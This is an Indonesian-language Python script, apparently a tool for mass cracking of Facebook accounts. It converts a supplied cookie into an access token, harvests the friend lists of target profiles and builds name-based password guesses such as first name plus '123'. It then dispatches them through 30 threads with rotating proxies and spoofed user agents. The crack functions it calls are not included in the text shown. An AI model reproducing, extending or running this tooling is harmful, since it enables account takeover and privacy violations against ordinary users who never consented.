#ASTAGFIRULLAH JEBOL
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.panel import Panel as panel
from rich import print as cetak
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from pwinput import pwinput
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#from tk import Tk

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
ugen ,ugen2= [],[]
loop,bra = 0,[]
ok,cp,oo = 0,0,[]
usragent = []
tokenku = []
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	bra_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT ]----------###
#Mozilla/5.0 (Linux; Android 12; vivo 1938 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 Instagram 283.0.0.20.105 Android (31/12; 320dpi; 720x1495; vivo; vivo 1938; 1938; mt6765; in_ID; 475221261)
#[24/5 11.08] RAF MKZ: Mozilla/5.0 (Linux; Android 12; 220333QAG Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 Instagram 283.0.0.20.105 Android (31/12; 360dpi; 720x1507; Xiaomi/Redmi; 220333QAG; fog; qcom; in_ID; 475221261)
for ugenku in range(10000) :
	a=f'Viber/9.7.5.3'
	b=f'CFNetwork/976'
	c=f'Darwin/18.2.0'
	raff=f'{a} {b} {c}'
	ugen.append(raff) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	#d=random.randrange(1, 9) 
	e='PRO 7-S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SLA-L02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='SAMSUNG SM-N960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='Tab2A7-10F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='Coolpad R108 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	#d=random.randrange(1, 9) 
	e='P9000_MAX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='ATU-L31 Build/HUAWEIATU-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 600) 
	g='0'
	h=random.randrange(10, 7000) 
	i=random.randrange(10, 700) 
	j='Mobile Safari/537.36 GSA/'+str(random.randrange(1, 100)) +'.'+str(random.randrange(10, 100))+'.'+str(random.randrange(1,100))+'.'+str(random.randrange(1, 100))+'.arm64'
	raff=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raff) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='POT-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='G3116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	#d=random.randrange(1, 9) 
	e='BLN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c=random.randrange(1, 9) 
	d=random.randrange(1, 9) 
	e='SM-G611F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(10, 500) 
	g='0'
	h=random.randrange(10, 6000) 
	i=random.randrange(19, 500) 
	j='Mobile Safari/537.36'
	raf=f'{a} {b}.{c}.{d}; {e}{f}.{g}.{h}.{i} {j}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 15) 
	c='FIG-LX1 Build/HUAWEIFIG-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(10, 500) 
	e='0'
	f=random.randrange(10, 6000) 
	g=random.randrange(19, 500) 
	h='Mobile Safari/537.36'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(raf) 
###----------[ PEWARNA ]----------###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
#running text##
os.system('clear') 
def running_text(s) :
	for c in s + '\n':
		sys.stdout.write(c) 
		sys.stdout.flush() 
		time.sleep(random.random() * 0.2) 

###----------[ UNTUK ANIMASI ]----------###
def bra_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def bra_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
###----------[ BANNER MENUH ]----------###
def banner() :
    text=tekz(f''' ╔══╗╔═══╦═══╦════╗╔═╗╔═╦═══╗
║╔╗║║╔═╗║╔═╗║╔╗╔╗║╚╗╚╝╔╩╗╔╗║
║╚╝╚╣║─║║║─║╠╝║║╚╝─╚╗╔╝─║║║║
║╔═╗║╚═╝║║─║║─║║───╔╝╚╗─║║║║
║╚═╝║╔═╗║╚═╝║─║║──╔╝╔╗╚╦╝╚╝║
╚═══╩╝─╚╩═══╝─╚╝──╚═╝╚═╩═══╝''') 
    text.stylize("bold white") 
    cetak(nel(text,width=79,title=f'[bold dim] BANNER', style='magenta'))                         


#BANNER KUNCI##
def bankun() :
    text=tekz(f''' 
╔══╗╔═══╦═══╦════╗╔═══╦╗╔╗╔╗
║╔╗║║╔═╗║╔═╗║╔╗╔╗║║╔═╗║║║║║║
║╚╝╚╣║─║║║─║╠╝║║╚╝║╚═╝║║║║║║
║╔═╗║╚═╝║║─║║─║║──║╔══╣╚╝╚╝║
║╚═╝║╔═╗║╚═╝║─║║──║║──╚╗╔╗╔╝
╚═══╩╝─╚╩═══╝─╚╝──╚╝───╚╝╚╝''', justify="center") 
    text.stylize("bold white") 
    cetak(nel(text,width=79,title=f'[bold dim] PASSWORD', style='magenta')) 
###----------[ NGECEK COOKIES ]----------###
def sandi() : 
	os.system('clear') 
	bankun() 
	pasword = pwinput('[•] MASUKKAN KATA SANDI : ') 
	if pasword =='BaotXD' :
		running_text(f'{k}[•] SEDANG MEMERIKSA SANDI... ') 
		time.sleep(2) 
		print(f'{h}[√] SANDI DI TERIMA') 
		time.sleep(1) 
		login() 
	else:
		#print('SANDI ANDA SALAH') 
		running_text(f'{k}[•] SEDANG MEMERIKSA SANDI... ') 
		time.sleep(1) 
		print(f'{mer}[x] SANDI SALAH') 
		exit() 
def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenefb.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenefb[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
		os.system('clear') 
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		print(f'{m}\t\tPERHATIAN!!\n\r{k}JANGAN GUNAKAN AKUN PRIBADI') 
		your_cookies = input('[•] Masukan Cookie : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n ╰─  Login Berhasil | Jalankan ulang Script nya");exit()

			except Exception as e:

				print(" ╰─  Cookies Mokad bang")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
	

###----------[ BAGIAN MENU ]----------###
def menu(my_name,my_id) :
	try:
		cok = open('.cok.txt','r').read()
	except IOError:
		bra_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_lagi334() 
	os.system('clear')
	banner()
	#running_text('> > > > > > > > > > > > > > >] 100%') 
	nge_crack()
	
###----------[ DUMP ID PUBLIK ]----------###

def nge_crack():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		text=tekz("IMPUT NOMINAL TARGET YANG INGIN DI CRACK", justify="center") 
		text.stylize("bold magenta") 
		cetak(nel(text,width=79, title=f"[dim]CRACK MASSAL", style="bold white")) 
	except IOError:
		exit()
	try:
	    mek="╭────────────────────╮\n│ Mau berapa target? │: "
	    su="""╰────────────────────╯"""
	    jum=int(input(mek)) 
	    print(su) 
	except ValueError:
		print('{biru}━─═ ◕➤ Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f'{h}{biru}━─═ ◕➤ Pertemanan Tidak Publik  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		pakli=f"{u}╭───────────────────────────────╮\n│{u} Masukkan id target yang ke  "
		su=f"""{u}╰───────────────────────────────╯"""
		kl = input(pakli+str(yz)+' │: ')
		uid.append(kl)
		print(su) 
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenefb[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{biru}━─═ ◕➤ Unstable Signal ')
			exit()
	try:
		#mengetik('> > > > > > > > > > > > > > >] 100%') 
	    txt=tekz("  TOTAL ID YANG TERKUMPUL : ",justify="center") 
	    txt.stylize("italic white") 
	    cetak(nel(txt+str(len(id)),width=79,style="magenta")) 
	    atur_dulu()
		#cetak(nel(f'[•] Total Idz Target Yang Terkumpul : '+str(len(id)),width=79))
		
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('{biru}━─═ ◕➤ Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f'{biru}━─═ ◕➤  Friendship Not Public ')
		time.sleep(3)
		back()

###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	#os.system('clear') 
	cik=tekz("🛠🛠PILIHAN UMUR AKUN🛠🛠", justify="center") 
	cik.stylize("bold magenta") 
	cetak(nel(cik,width=79)) 
	#banner() 
	syg=[]
	syg.append(nel(f'\t    [italic white]CRACK OLD',width=39,title=f'[bold white][[bold magenta]1[bold white]]',style=" bold magenta")) 
	syg.append(nel(f'\t    [italic white]CRACK NEW',width=39,title=f'[bold white][[bold magenta]2[bold white]]',style=" bold magenta")) 
	wa=Console() 
	wa.print(Columns(syg)) 
	coklat=tekz(f'CRACK RANDOM',justify="center")
	coklat.stylize("italic white") 
	cetak(nel(coklat,width=79,title=f'[bold white][[bold magenta]3[bold white]]',style=" bold magenta")) 
	aturid = input(f'[•] CHOICE : ') 
	if aturid in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		bra_anim(f'{biru} ━─═ ◕➤yang bener lah ster')
		exit()
#	tree= Tree(' ') 
	cuak=tekz("🛠🛠PILIHAN METODH🛠🛠",justify="center") 
	cuak.stylize("bold magenta") 
	cetak(nel(cuak,width=79, style="bold white")) 
	sygg=[]
	sygg.append(nel(f'\t    [italic white]REGULER',width=39,title=f'[bold white][[bold magenta]1[bold white]]',style=" bold magenta")) 
	sygg.append(nel(f'\t    [italic white]ASYCN',width=39,title=f'[bold white][[bold magenta]2[bold white]]',style=" bold magenta")) 
	wa.print(Columns(sygg)) 
	pak=tekz('VALIDATE', justify="center") 
	pak.stylize("italic white") 
	cetak(nel(pak,width=79, title=f'[bold white][[bold magenta]3[bold white]]',style=" bold magenta")) 
	#print(' ━─═ ◕➤4. (alpha)')
	#print(' ━─═ ◕➤5. metode (X) ')
	metod = input(f'[•] CHOICE : ')
	if metod in ['1','01']:
		bra.append('mobile')
	elif metod in ['2','02']:
		bra.append('free')
	elif metod in ['3', '03']:
		bra.append('validate') 
	#elif metod in ['4', '04']:
		##bra.append('alpha') 
	#elif metod in ['5', '05']:
		#bra.append('xfb') 
	else:
		bra.append('free')
	passwrd()
from datetime import datetime
###----------[  BAGIAN WORDLIST ]----------###
def passwrd():
	#os.system('clear') 
	#banner() 
	global prog,des
	 
	prog = Progress(SpinnerColumn('runner'),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	awal= datetime.now() 
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'321')
						pwv.append('muhammad'+frs) 
						#pwv.append(frs+'1')
						#pwv.append(frs+'2')
						#pwv.append(frs+'3')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'1') 
						pwv.append(frs+'2') 
						pwv.append(frs+'3') 
						pwv.append(frs+'pendek') 
						pwv.append('daeng'+frs) 
						pwv.append(frs+'cantik') 
						pwv.append(frs+'sayang') 
						pwv.append(frs+'pesek') 
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in bra:
					gas_krek.submit(crackfree,idf,pwv) 
				elif 'mobile' in bra:
					gas_krek.submit(crackmobile,idf,pwv) 
				elif 'validate' in bra:
					gas_krek.submit(validate1,idf,pwv) 
				#elif 'alpha' in bra:
					#gas_krek.submit(bapi,idf,pwv)
				#elif 'xfb' in bra:
					#gas_krek.submit(colmek1,idf,pwv)
				else:
					gas_krek.submit(crackfree,idf,pwv) 
		tree=Tree(f'\t\tAKUN SAVE IN') 
		tree.add(f'[bold white]======================================================') 
		tree.add(f'{biru}+ {puti}akun ok : {biru}%s{kun} '%(ok))
		tree.add(f'{ung}+ {mer}akun cp : {ung}%s{kun} '%(cp))
		tree.add(f'[bold white]======================================================') 
		cetak(tree) 
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
